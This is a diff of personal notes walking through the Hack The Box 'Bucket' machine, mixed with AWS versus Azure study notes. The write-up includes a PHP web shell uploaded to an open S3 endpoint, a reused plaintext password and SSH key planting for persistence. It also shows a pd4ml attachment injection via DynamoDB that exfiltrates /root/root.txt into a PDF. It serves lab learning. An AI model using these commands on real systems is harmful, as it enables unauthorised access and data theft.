@@ -9,8 +9,11 @@ Goals:
 - Perform a Linux Hardening and Persistence
 - Hunt for 3 more content creators for this type of learning exercise - want to do one a week to compliment start really focusing on completing one HTB Active machine a week from Febuary. 
 Learnt:
+- AWS basics
+- Routing possiblities on apache config
+
 Beyond Root:
-- Harden box
+- Harden box - Failed no time More Azure Instead
 - Add a low and high priv Persistence + plus create a vuln on the box
 - Return to every description of AWS vs Azure - Look at what my notes say, then search engine dork and ChatGPT the answers for a average time per AWS  vs Azure point.
 
@@ -51,7 +54,7 @@ Guess: bash, \*Shell or `Az` binary is used to query resources or wrap queries t
 
 Alh4zr3d points out a trick to figure out how to: Clarify host OS version from webserver version?
 
-[S3 Amazo Augmented Definitions](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html): *"Amazon Simple Storage Service (Amazon S3) is an object storage service - [using Amazon S3 storage classes](https://docs.aws.amazon.com/AmazonS3/latest/userguide/storage-class-intro.html) that offers industry-leading scalability, data availability, security, and performance. Customers of all sizes and industries can use Amazon S3 to store and protect any amount of data for a range of use cases, such as data lakes, websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics. Amazon S3 provides management features so that you can optimize, organize, and configure access to your data to meet your specific business, organizational, and compliance requirements."*
+[S3 Amazon Augmented Definitions](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html): *"Amazon Simple Storage Service (Amazon S3) is an object storage service - [using Amazon S3 storage classes](https://docs.aws.amazon.com/AmazonS3/latest/userguide/storage-class-intro.html) that offers industry-leading scalability, data availability, security, and performance. Customers of all sizes and industries can use Amazon S3 to store and protect any amount of data for a range of use cases, such as data lakes, websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics. Amazon S3 provides management features so that you can optimize, organize, and configure access to your data to meet your specific business, organizational, and compliance requirements."*
 
 Al ask: What should we poke at or look for vulnerabililty-wise?
 My answers:
@@ -112,13 +115,11 @@ Although it is being removed.
 
 ```bash
 aws --endpoint-url http://s3.bucket.htb --no-sign-request s3 cp cmd.php s3://adserver/images/
-
-
 ```
 
 ## Foothold
 
-![](ready.png)
+![1000](ready.png)
 I failed initialliy because I was targetting the s3. not the domain that is hosting the website
 ![](hurray.png)
 
@@ -200,7 +201,7 @@ www-data@bucket:/home/roy/project/vendor$ aws dynamodb scan --table-name users -
 ## PrivEsc
 
 Password reuse or just that the sysadm is role that roy has
-`roy : n2vM-<_K_Q:.Aa2`
+`roy : n2vM-<_K_Q:.Aa2 `
 ![](suroy.png)
 Not made ssh key and used it as a second shell as I have always made other more hacker-y shells from binaries on the box to learn more hacker-y things
 ```bash
@@ -209,7 +210,6 @@ ssh-keygen
 # target 
 mkdir .ssh
 echo "ssh-rsa $base64fromkey" > .ssh/authorized_keys
-
 ```
 and ssh in 
 ![](sshin.png)
@@ -248,7 +248,7 @@ To index.php is going to:
 3. Make random filename in files/
 4. transforms the file at file/$random into pdf file result.pdf
 
-![](Igota200.png)
+![1000](Igota200.png)
 Although... : (
 ![](butnofilethere.png)
 
@@ -292,6 +292,85 @@ I typo-ed Ransomware as I obviously have not had to type it into every report ye
 
 Something went wrong along the way such that the files did not get created. - at https://www.youtube.com/watch?v=vSug24hrQdo
 
+[Comparing 0xdf, the endpoint is positioned first](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html#shell-as-root)
+```bash
+aws --endpoint-url http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH  AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 
+# PoC the table creation and retrieval in the script
+aws --endpoint-url http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"}, "data":{"S":"mad data"}}'
+# Going curl instead of burp this time:
+curl http://127.0.0.1:8000/index.php --data 'action=get_alerts'
+# Scp the file
+scp roy@bucket.htb:/var/www/bucket-app/files/result.pdf .
+# copy and paste
+n2vM-<_K_Q:.Aa2
+
+```
+
+![1000](thisboxnowaswideasabucket.png)
+Presumably it has something to do with the credentials in this directory or using the functionality to grab another file.
+
+AWS vs Azure
+
+Creating blob storage through the Azure Portal is accomplished by having a Storage Account and a container within that account, blobs can be uploaded. Depending on the use case of the organisation the type of storage temperature - throughput volume requirements -  structure data should store in Azure Tables.
+
+
+Adding a attachment [pd4ml](https://pd4ml.com/support-topics/usage-examples/)
+![](itsnotabugitsafeature.png)
+
+We then need to place that in the Json to force the resulting to PDF to produce something as the string data we provided would appear in the PDF. The paperclip feature of Pd4ml will create a nice clip icon that will be the embedded exfiltrated file. Lmao.
+
+```bash
+aws --endpoint-url http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH  AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 
+# GEt the paperclip
+aws --endpoint-url http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<pd4ml:attachment src=\"file:///root/root.txt\" description=\"attachment sample\" icon=\"Paperclip\"/>"}}'
+# Going curl instead of burp this time:
+curl http://127.0.0.1:8000/index.php --data 'action=get_alerts'
+# scp the file
+scp roy@bucket.htb:/var/www/bucket-app/files/result.pdf .
+# Copy and past password
+n2vM-<_K_Q:.Aa2
+
+```
+
+AWS vs Azure
+
+Provisioning *IMO* should done at the ARM template or Bicep level such that it is monitorable with the Azure Billing rather than at the command line level. You can with Powershell, Az and set configurations, but this seems a error prone nightmare waiting to happen. This is the first time Powershell syntaxt is eclipsed by AWS verbosity. Provisioning is type based rather than tuning the unit of RW in Azure or atleast as far as I am aware.
+
+
 ## Beyond Root
 
 Well I added a hardening and persistence method throughout this, so this will be the Azure and AWS. 
+
+[Ippsec](https://www.youtube.com/watch?v=SgWhuTxm2oY) made the creating a table part seem easy - I did have heavy cold and my brain seemed like mush and AWS documentation is rough. 
+
+[0xdf](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html) points out in his beyond Root section the reason as to how we are able to access the DB on localhost:4566 - apache config has a VirtualHost section with [ProxyPass](https://httpd.apache.org/docs/2.4/mod/mod_proxy.html#proxypass) (Maps remote servers into the local server URL-space). *"This directive allows remote servers to be mapped into the space of the local server. The local server does not act as a proxy in the conventional sense but appears to be a mirror of the remote server. The local server is often called a reverse proxy or gateway. The path is the name of a local virtual path; url is a partial URL for the remote server and cannot include a query string."*
+
+It also has three servers - one for the routing to server on port 8000, second is to redirect to bucket.htb and the third is the proxy to localhsot:4566.
+
+[0xdf](https://0xdf.gitlab.io/2021/05/03/more-bucket-beyond-root.html) has a More Beyond Root concept. Why is there no image directory. Basically it exists in the container, but the routing of the (virtual) servers points to the bucket in a container, which is all host out of that /var/ww/html web directory.
+
+
+#### Azure
+
+[Azure Storage](https://learn.microsoft.com/en-us/azure/storage/tables/table-storage-overview): *"Azure Table storage is a service that stores non-relational structured data (also known as structured NoSQL data) in the cloud, providing a key/attribute store with a schemaless design."*
+
+This does also require a storage account and resource group.
+
+[Create a AzStorageTable storage](https://learn.microsoft.com/en-us/azure/storage/tables/table-storage-how-to-use-powershell) table associated with the storage account in Azure and relevant activities
+```powershell
+# Create new table
+New-AzStorageTable -Name $tableName –Context $ctx
+# create a object to perform table operations
+$storageTable = Get-AzStorageTable –Name $tableName –Context $ctx
+# Get the manditory CloudTable, will create a table if non-existent
+$cloudTable = $storageTable.CloudTable
+# table entries - entityOne/Two are fields 
+Add-AzTableRow -table $cloudTable -partitionKey $partitionKey -rowKey ("CA") -property @{"entityOne"="data";"entityTwo"=1}
+# Query the table; for specifics use: -columnName "" -value "" -operator $op
+Get-AzTableRow -table $cloudTable | ft
+# Delete a table
+Remove-AzStorageTable –Name $tableName –Context $ctx
+```
+
+The URL like the endpoint URL in AWS can also have SAS token for monitor and secure access to an endpoint. 
+
